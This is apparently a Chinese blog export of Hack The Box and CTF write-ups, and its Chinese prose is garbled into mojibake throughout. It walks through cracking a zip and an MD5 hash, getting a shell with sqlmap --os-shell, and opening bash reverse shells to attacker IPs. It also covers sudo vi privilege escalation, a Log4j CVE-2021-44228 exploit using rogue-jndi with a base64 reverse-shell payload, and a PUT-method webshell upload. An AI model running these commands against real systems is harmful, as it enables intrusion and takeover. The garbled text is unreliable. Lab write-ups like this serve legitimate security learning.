src="../images/image-20230408153321269.png" alt="image-20230408153321269"></p><p>æ²¡æœ‰å¤´ç»ªåæŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªç½‘å€ï¼Œå‘ç°æ˜¯è¿™ä¸ªç™»å½•æ¡†ï¼Œäºæ˜¯å°è¯•ä¸€ä¸‹ä¸‡èƒ½å¯†ç ç™»å½•ï¼Œå¼±å¯†ç   sqlmapå•¥çš„   å‘ç°ä¸å¤ªè¡Œ</p><p><img src="../images/image-20230408153614411.png" alt="image-20230408153614411"></p><p>ç„¶åå°è¯•ä¸€ä¸‹æ‰«ä¸€ä¸‹è¿™ä¸ªç½‘ç«™çš„ç›®å½•çœ‹æœ‰æ²¡æœ‰å•¥å‘ç°   ä¹Ÿæ²¡å•¥å¯ç”¨çš„ä¸œè¥¿  é‚£ä¹ˆæˆ‘ä»¬å°±å°è¯•ä¸€ä¸‹ç ´è§£å‹ç¼©åŒ…çš„å¯†ç </p><p>æ²¡åˆ«çš„,æš´ç ´,ä½¿ç”¨åœ¨ <code>Responder</code> æ¥è§¦è¿‡çš„ <code>john</code> å·¥å…·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john backup.zip &gt; hash.txt </span><br><span class="line">è¿™ä¸ªæ˜¯å°†backup.zip çš„å“ˆå¸Œå¯¼å‡º</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john -wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230408155800420.png" alt="image-20230408155800420"></p><p>ç„¶åå¾—å‡ºè§£ç çš„å¯†ç æ˜¯<strong>741852963</strong></p><p>ç„¶åå°±å»æŸ¥çœ‹æºç </p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="string">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span>) &#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: dashboard.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span> &gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;MegaCorp Login&lt;/title&gt;</span><br><span class="line">  &lt;link href=<span class="string">&quot;https://fonts.googleapis.com/css?family=Open+Sans:400,700&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;./style.css&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">  &lt;h1 align=center&gt;MegaCorp Login&lt;/h1&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- partial:index.partial.html --&gt;</span><br><span class="line">&lt;body <span class="class"><span class="keyword">class</span>=&quot;<span class="title">align</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">  &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">grid</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">action</span>=&quot;&quot; <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span> <span class="title">login</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form__field</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">login__username</span>&quot;&gt;&lt;<span class="title">svg</span> <span class="title">class</span>=&quot;<span class="title">icon</span>&quot;&gt;&lt;<span class="title">use</span> <span class="title">xmlns</span>:<span class="title">xlink</span>=&quot;<span class="title">http</span>://<span class="title">www</span>.<span class="title">w3</span>.<span class="title">org</span>/1999/<span class="title">xlink</span>&quot; <span class="title">xlink</span>:<span class="title">href</span>=&quot;#<span class="title">user</span>&quot;&gt;&lt;/<span class="title">use</span>&gt;&lt;/<span class="title">svg</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">hidden</span>&quot;&gt;<span class="title">Username</span>&lt;/<span class="title">span</span>&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">login__username</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">class</span>=&quot;<span class="title">form__input</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Username</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form__field</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">login__password</span>&quot;&gt;&lt;<span class="title">svg</span> <span class="title">class</span>=&quot;<span class="title">icon</span>&quot;&gt;&lt;<span class="title">use</span> <span class="title">xmlns</span>:<span class="title">xlink</span>=&quot;<span class="title">http</span>://<span class="title">www</span>.<span class="title">w3</span>.<span class="title">org</span>/1999/<span class="title">xlink</span>&quot; <span class="title">xlink</span>:<span class="title">href</span>=&quot;#<span class="title">lock</span>&quot;&gt;&lt;/<span class="title">use</span>&gt;&lt;/<span class="title">svg</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">hidden</span>&quot;&gt;<span class="title">Password</span>&lt;/<span class="title">span</span>&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">login__password</span>&quot; <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">class</span>=&quot;<span class="title">form__input</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Password</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form__field</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Sign</span> <span class="title">In</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">  &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">  &lt;<span class="title">svg</span> <span class="title">xmlns</span>=&quot;<span class="title">http</span>://<span class="title">www</span>.<span class="title">w3</span>.<span class="title">org</span>/2000/<span class="title">svg</span>&quot; <span class="title">class</span>=&quot;<span class="title">icons</span>&quot;&gt;&lt;<span class="title">symbol</span> <span class="title">id</span>=&quot;<span class="title">arrow</span>-<span class="title">right</span>&quot; <span class="title">viewBox</span>=&quot;0 0 1792 1792&quot;&gt;&lt;<span class="title">path</span> <span class="title">d</span>=&quot;<span class="title">M1600</span> 960<span class="title">q0</span> 54-37 91<span class="title">l</span>-651 651<span class="title">q</span>-39 37-91 37-51 0-90-37<span class="title">l</span>-75-75<span class="title">q</span>-38-38-38-91<span class="title">t38</span>-91<span class="title">l293</span>-293<span class="title">H245q</span>-52 0-84.5-37.5<span class="title">T128</span> 1024<span class="title">V896q0</span>-53 32.5-90.5<span class="title">T245</span> 768<span class="title">h704L656</span> 474<span class="title">q</span>-38-36-38-90<span class="title">t38</span>-90<span class="title">l75</span>-75<span class="title">q38</span>-38 90-38 53 0 91 38<span class="title">l651</span> 651<span class="title">q37</span> 35 37 90<span class="title">z</span>&quot;/&gt;&lt;/<span class="title">symbol</span>&gt;&lt;<span class="title">symbol</span> <span class="title">id</span>=&quot;<span class="title">lock</span>&quot; <span class="title">viewBox</span>=&quot;0 0 1792 1792&quot;&gt;&lt;<span class="title">path</span> <span class="title">d</span>=&quot;<span class="title">M640</span> 768<span class="title">h512V576q0</span>-106-75-181<span class="title">t</span>-181-75-181 75-75 181<span class="title">v192zm832</span> 96<span class="title">v576q0</span> 40-28 68<span class="title">t</span>-68 28<span class="title">H416q</span>-40 0-68-28<span class="title">t</span>-28-68<span class="title">V864q0</span>-40 28-68<span class="title">t68</span>-28<span class="title">h32V576q0</span>-184 132-316<span class="title">t316</span>-132 316 132 132 316<span class="title">v192h32q40</span> 0 68 28<span class="title">t28</span> 68<span class="title">z</span>&quot;/&gt;&lt;/<span class="title">symbol</span>&gt;&lt;<span class="title">symbol</span> <span class="title">id</span>=&quot;<span class="title">user</span>&quot; <span class="title">viewBox</span>=&quot;0 0 1792 1792&quot;&gt;&lt;<span class="title">path</span> <span class="title">d</span>=&quot;<span class="title">M1600</span> 1405<span class="title">q0</span> 120-73 189.5<span class="title">t</span>-194 69.5<span class="title">H459q</span>-121 0-194-69.5<span class="title">T192</span> 1405<span class="title">q0</span>-53 3.5-103.5<span class="title">t14</span>-109<span class="title">T236</span> 1084<span class="title">t43</span>-97.5 62-81 85.5-53.5<span class="title">T538</span> 832<span class="title">q9</span> 0 42 21.5<span class="title">t74</span>.5 48 108 48<span class="title">T896</span> 971<span class="title">t133</span>.5-21.5 108-48 74.5-48 42-21.5<span class="title">q61</span> 0 111.5 20<span class="title">t85</span>.5 53.5 62 81 43 97.5 26.5 108.5 14 109 3.5 103.5<span class="title">zm</span>-320-893<span class="title">q0</span> 159-112.5 271.5<span class="title">T896</span> 896 624.5 783.5 512 512<span class="title">t112</span>.5-271.5<span class="title">T896</span> 128<span class="title">t271</span>.5 112.5<span class="title">T1280</span> 512<span class="title">z</span>&quot;/&gt;&lt;/<span class="title">symbol</span>&gt;&lt;/<span class="title">svg</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;!-- <span class="title">partial</span> --&gt;</span></span><br><span class="line"><span class="class">  </span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p>ftpæœåŠ¡å™¨ä¸Šçš„å‹ç¼©åŒ…ç»™äº†æºç    æºç é‡Œé¢æœ‰äº†è´¦å·å’Œå¯†ç ä½†æ˜¯å¯†ç æ˜¯md5åŠ å¯†è¿‡çš„ï¼Œé‚£æˆ‘ä»¬å°±å°è¯•è¿›è¡Œmd5è§£å¯†æŸ¥çœ‹ä¸€ä¸‹</p><p><img src="../images/image-20230408160129305.png" alt="image-20230408160129305"></p><p>æŸ¥åˆ°å¯†ç ï¼Œå°è¯•è¿›è¡Œç½‘ç«™ç™»å½•</p><p><img src="../images/image-20230408160208170.png" alt="image-20230408160208170"></p><p>æˆåŠŸç™»å½•</p><p><strong>å…¶å®è¿™ä¸ªå¯†ç å°±æ˜¯ä¸ªå¼±å£ä»¤    ç„¶åå®ƒè¾“å…¥å¯†ç çš„æ—¶å€™æ²¡æœ‰è¿›è¡Œé™åˆ¶ï¼Œæˆ‘ä»¬å…¶å®å¯ä»¥æŠ“åŒ…ç„¶åçˆ†ç ´ä»–çš„å¯†ç </strong></p><p><img src="../images/image-20230408160429553.png" alt="image-20230408160429553"></p><p>å®ƒè¿™ä¸ªurlå­˜åœ¨ä¸€ä¸ªç±»ä¼¼sqlæ³¨å…¥çš„ç©æ„   æ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥è¿›è¡Œsqlæ³¨å…¥ä¸€ä¸‹</p><p>åŠ äº†ä¸ªå•å¼•å·å°±å¾ˆä¸äº‰æ°”çš„éœ²å‡ºé©¬è„šäº†,ä»¥å‰è®²è¿‡æŠ¥é”™æ³¨å…¥,ä½†æ˜¯æˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„æ˜¯è·å–ä¸€å®šæƒé™,é‚£å°±è¦ç”¨åˆ° <code>--os-shell</code> äº†</p><p><img src="../images/image-20230408160608750.png" alt="image-20230408160608750"></p><p>ç®€å•çš„æŸ¥è¯¢çˆ†å‡ºäº†sqlè¯­å¥  æ›´åŠ è¯´æ˜äº†å­˜åœ¨sqlæ³¨å…¥äº†</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±ç›´æ¥ä¸Šsqlmapäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://10.129.247.81/dashboard.php?search=1 --cookie=&quot;PHPSESSID=e3ip6sjdos4nrjq6qcoi3vs2k4&quot; --os-shell</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯å¿…é¡»å¾—åŠ ä¸Šcookieä¸è®©è·å–ä¸æˆåŠŸ</p><p>å› ä¸ºå®ƒçš„æƒé™ä¹Ÿå¾ˆä½,æˆ‘è¿çœ‹æ–‡ä»¶éƒ½çœ‹ä¸äº†,ç»§ç»­ç”¨ <code>bash</code> å‘½ä»¤è¿ <code>nc</code></p><p><img src="../images/image-20230408161800060.png" alt="image-20230408161800060"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 443</span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.6/443 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230408161903638.png" alt="image-20230408161903638"></p><p>æˆåŠŸæŠŠshellå¼¹è¿‡æ¥äº†</p><p>ç„¶åå°±è¿›è¡Œæ–‡ä»¶çš„æŸ¥çœ‹</p><p><img src="../images/image-20230408162756772.png" alt="image-20230408162756772"></p><p><img src="../images/image-20230408162735318.png" alt="image-20230408162735318"></p><p>å‘ç°æ•°æ®åº“çš„è´¦å·å¯†ç </p><p>ç„¶åç”±äºè¿™é‡Œæ‰«ç«¯å£çš„æ—¶å€™æ²¡å‘ç°æœ‰æ•°æ®åº“çš„ç«¯å£</p><p>äºæ˜¯å°±çŒœæµ‹æ˜¯ä¸æ˜¯sshçš„ç«¯å£çš„è´¦å·å¯†ç </p><p><img src="../images/image-20230408163006747.png" alt="image-20230408163006747"></p><p>æœç„¶æ˜¯ï¼Œç™»å½•æˆåŠŸ</p><p><img src="../images/image-20230408163030228.png" alt="image-20230408163030228"></p><p>æ‹¿åˆ°userçš„root,é‚£è¿˜æœ‰rootç”¨æˆ·çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å°è¯•è¿›è¡Œææƒ</p><p><strong>sudo -l    â€”â€”â€”ã€‹    -l æ˜¾ç¤ºå‡ºè‡ªå·±ï¼ˆæ‰§è¡Œ sudo çš„ä½¿ç”¨è€…ï¼‰çš„æƒé™</strong></p><p><img src="../images/image-20230408163253349.png" alt="image-20230408163253349"></p><p>å‘ç°æ­¤ç”¨æˆ· /bin/vi å¤„ç†/etc/postgresql/11/main/pg_hba.conf å…·æœ‰rootæƒé™</p><p>æ‰€ä»¥å°±ä½¿ç”¨viæ¥è¿›è¡Œææƒ</p><p>æˆ‘ä»¬å¯ä»¥ä»¥ <code>root</code> æƒé™ç¼–è¾‘ <code>pg_hba.conf</code> æ–‡ä»¶,è¾“å…¥ä¸‹é¢è¯­å¥,åˆ†ä¸¤æ¬¡ç¼–è¾‘</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf</span><br><span class="line">:set shell=/bin/sh     :wq ä¿å­˜é€€å‡º</span><br><span class="line">:shell                 å›è½¦</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230408165233922.png" alt="image-20230408165233922"></p><p>è¿™é‡Œç»™æˆ‘æŠ˜è…¾äº†å¥½ä¹…ï¼Œæ˜¯å†™å…¥<strong>:set shell=/bin/sh</strong>ï¼Œç„¶ååœ¨ç¼–è¾‘wqå¤„é‚£è¾“å…¥shell</p><p><strong>è¿™é‡Œè¿™ä¸ªææƒå’Œsuidé‚£ä¸ªå·®ä¸å¤š</strong></p><h2 id="Unified-java-Log4j-CVE-202144228"><a href="#Unified-java-Log4j-CVE-202144228" class="headerlink" title="Unified(java - Log4j CVE-202144228)"></a>Unified(java - Log4j CVE-202144228)</h2><p>è€ƒç‚¹</p><p><img src="../images/image-20230408170926892.png" alt="image-20230408170926892"></p><p>ç°pingä¸€ä¸‹<img src="../images/image-20230408171010357.png" alt="image-20230408171010357"></p><p>æ¥ä¸‹æ¥å°±æ˜¯ç«¯å£æ‰«æäº†(è¿™é‡Œæ‰«çš„å¤ªæ…¢äº†ï¼Œå°±ç›´æ¥æ‹¿åˆ«äººæ‰«çš„ç«¯å£æ¥ç”¨äº†)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">6789/tcp open  ibm-db2-admin?</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">8443/tcp open  ssl/nagios-nsca Nagios NSCA</span><br></pre></td></tr></table></figure><p>å°±æ˜¯è¿™äº›å¸¸è§„çš„ç«¯å£</p><p>SSH ç™»å½•å°è¯•å¤±è´¥ï¼Œ6789 ç«¯å£æ˜¯ <a href="https://so.csdn.net/so/search?q=db2&amp;spm=1001.2101.3001.7020">db2</a> æ•°æ®åº“çš„ç®¡ç†ç«¯å£ï¼Œ8080 ç«¯å£æ˜¯ä¸ªä»£ç†è½¬å‘ç«¯å£ï¼Œè®¿é—®ä¼šé‡å®šå‘åˆ° 8443 ç«¯å£æ˜¯ UniFi 6.5.54 äº§å“çš„é¡µé¢ï¼Œå‘ç°è¯¥ç‰ˆæœ¬å­˜åœ¨ <strong>CVE-2021-44228 æ¼æ´</strong></p><p><img src="../images/image-20230409161734932.png" alt="image-20230409161734932"></p><p>ç„¶åå‘ç°è¿™ä¸ªç‰ˆæœ¬çš„unifiå­˜åœ¨æ¼æ´ï¼Œå°±æ˜¯ä¸Šé¢å†™çš„CVEæ¼æ´   ç›´æ¥æœå°±èƒ½æœå‡ºè¿™ä¸ªCVE</p><p><strong>æ¼æ´å¤ç°</strong></p><p>å°è¯•å¤ç° CVE-2021-44228ï¼Œæ›¾ç»é£é¡ä¸€æ—¶çš„æ¼æ´ <code>Apache log4j</code>ï¼Œè¿™æ˜¯ java æ¯”è¾ƒå¸¸ç”¨çš„æ—¥å¿—ç›‘æ§ç»„ä»¶</p><p>åŸç†å°±æ˜¯æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ¶æ„æœåŠ¡ï¼ŒæœåŠ¡å™¨è¯·æ±‚æ‰§è¡Œï¼Œè¾¾åˆ°æ§åˆ¶çš„ç›®çš„ï¼Œä»¥<code>rmi</code>ä¸ºä¾‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RMIæ˜¯Javaçš„ä¸€ç»„æ‹¥æŠ¤å¼€å‘ åˆ†å¸ƒå¼åº”ç”¨ç¨‹åº çš„ API ã€‚ RMIä½¿ç”¨Javaè¯­è¨€ æ¥å£ å®šä¹‰äº†è¿œç¨‹å¯¹è±¡ï¼Œå®ƒé›†åˆäº†Javaåºåˆ—åŒ–å’ŒJavaè¿œç¨‹æ–¹æ³•åè®® (Java Remote Method Protocol)ã€‚ ç®€å•åœ°è¯´ï¼Œè¿™æ ·ä½¿åŸå…ˆçš„ç¨‹åºåœ¨åŒä¸€æ“ä½œç³»ç»Ÿçš„æ–¹æ³•è°ƒç”¨ï¼Œå˜æˆäº†ä¸åŒæ“ä½œç³»ç»Ÿä¹‹é—´ç¨‹åºçš„æ–¹æ³•è°ƒç”¨</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230409163952178.png" alt="image-20230409163952178"></p><p>æ€ä¹ˆè¯æ˜çš„çœ‹è¿™ç¯‡æ–‡ç« ï¼Œè¿™é‡Œæˆ‘å°±ä¸å†™äº†  â€”â€”-&gt;   <a href="https://blog.csdn.net/qq_40927195/article/details/128811787?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168102784016800213096118%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168102784016800213096118&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-128811787-null-null.142^v82^insert_down1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=htb%20unified&amp;spm=1018.2226.3001.4187">æ–‡ç« </a></p><p>è¯æ˜äº†æ¼æ´å­˜åœ¨ï¼Œæ¥ä¸‹æ¥è¿›è¡Œæ¼æ´çš„expåˆ©ç”¨</p><p><strong>ldap è½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼Œé»˜è®¤ç«¯å£389ï¼Œå¦‚æœå­˜åœ¨æ¼æ´å‘é€payloadæ¶ˆæ¯ï¼Œä¼šå‘é€æ•°æ®æŠ¥æ–‡åˆ°æœ¬æœº389ç«¯</strong></p><p><strong>æ¼æ´åˆ©ç”¨</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">å‡†å¤‡å·¥å…·ï¼š</span><br><span class="line">1.openjdk-11-jdk</span><br><span class="line">sudo apt-get install openjdk-11-jdk -y </span><br><span class="line">2.Maven</span><br><span class="line">sudo apt-get install maven -y</span><br><span class="line">3.ç¼–è¯‘maven</span><br><span class="line">git clone https://github.com/veracode-research/rogue-jndi</span><br><span class="line">cd rogue-jndi </span><br><span class="line">mvn package</span><br><span class="line">rogue-jndiï¼šå¼€å¯æœ¬æœºldapæœåŠ¡ï¼Œå…è®¸æ¥æ”¶å…¶ä»–æœåŠ¡å™¨æ•°æ®ï¼Œå¯æ‰§è¡Œä»£ç </span><br></pre></td></tr></table></figure><p>å‡†å¤‡<code>payload</code>ï¼Œè¾“å‡º<code>base64</code>ç¼–ç </p><p><strong>åå¼¹shell</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;bash -c bash -i &gt;&amp;/dev/tcp/10.10.16.24/4444 0&gt;&amp;1&#x27; |base64 </span><br><span class="line">YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjQvNDQ0NCAwPiYxCg==</span><br></pre></td></tr></table></figure><p>æ­å»º <code>ldap</code> æœåŠ¡å™¨ï¼Œä¼ é€’ <code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar target/RogueJndi-1.1.jar --command &quot;bash -c &#123;echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjQvNDQ0NCAwPiYxCg==&#125;|</span><br><span class="line">&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; --hostname &quot;&#123;10.10.16.24&#125;&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230409165256890.png" alt="image-20230409165256890"></p><p><strong>ç›‘å¬4444ç«¯å£</strong></p><p><img src="../images/image-20230409165154264.png" alt="image-20230409165154264"></p><p><strong>è¿›è¡Œå‘åŒ…</strong></p><p><img src="../images/image-20230409165324463.png" alt="image-20230409165324463"></p><p>å› ä¸ºå¼¹shellæ­»æ´»å¼¹ä¸æˆåŠŸ    æ‰€ä»¥å°±ç›´æ¥çœ‹wpå°±è¡Œäº†</p><p>wpæ¥çœ‹è¿™ç¯‡å°±è¡Œäº†       <a href="https://blog.csdn.net/weixin_51392885/article/details/127849252?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168102784016800213096118%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168102784016800213096118&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-127849252-null-null.142^v82^insert_down1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=htb%20unified&amp;spm=1018.2226.3001.4187">æ–‡ç« </a></p><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2>]]></content>
      
      
      
        <tags>
            
            <tag> htb æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-CMSåˆ·é¢˜è®°å½•</title>
      <link href="/posts/746c3a8a.html"/>
      <url>/posts/746c3a8a.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nssctf-web-åˆ·é¢˜è®°å½•</title>
      <link href="/posts/92a60629.html"/>
      <url>/posts/92a60629.html</url>
      
        <content type="html"><![CDATA[<h2 id="NSSRound-1-Basic-basic-check"><a href="#NSSRound-1-Basic-basic-check" class="headerlink" title="[NSSRound#1 Basic]basic_check"></a>[NSSRound#1 Basic]basic_check</h2><p><strong>è¿™é‡Œçš„è€ƒç‚¹æ˜¯putæ–¹æ³•</strong></p><p>é¢˜ç›®</p><p><img src="../images/image-20230323195811854.png" alt="image-20230323195811854"></p><p>å°±è¿™ç‚¹ä¸œè¥¿ï¼Œç„¶åæˆ‘ä»¬å»ä¿¡æ¯æ”¶é›†ï¼Œæ‰«ä¸€ä¸‹ç›®å½•å•¥çš„ï¼Œç„¶åå•¥ä¹Ÿæ²¡æ‰«åˆ°</p><p>æœ€åæ˜¯åˆ©ç”¨<strong>nikto</strong>è¿™ä¸ªå·¥å…·æ‰å‘ç°çš„è€ƒç‚¹   <a href="https://zhuanlan.zhihu.com/p/124246499">niktoå·¥å…·çš„ä»‹ç»</a></p><p><img src="../images/image-20230323200125587.png" alt="image-20230323200125587"></p><p>å‘ç°å¯ä»¥ä½¿ç”¨putæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å°±æ˜¯å¯ä»¥ç›´æ¥å†™å†…å®¹åˆ°è‡ªå®šä¹‰çš„æ–‡ä»¶é‡Œ</p><p><img src="../images/image-20230323200345772.png" alt="image-20230323200345772"></p><p>è¿™é‡Œå°±å‘ç°1.phpåˆ›å»ºæˆåŠŸäº†</p><p>ç„¶åå°±æˆåŠŸå†™å…¥shellï¼Œç„¶åå°±ç›´æ¥å»rceå°±è¡Œäº†</p><p><strong>å­¦åˆ°äº†ä¸ªæ–°çš„çŸ¥è¯†ç‚¹äº†</strong></p><h2 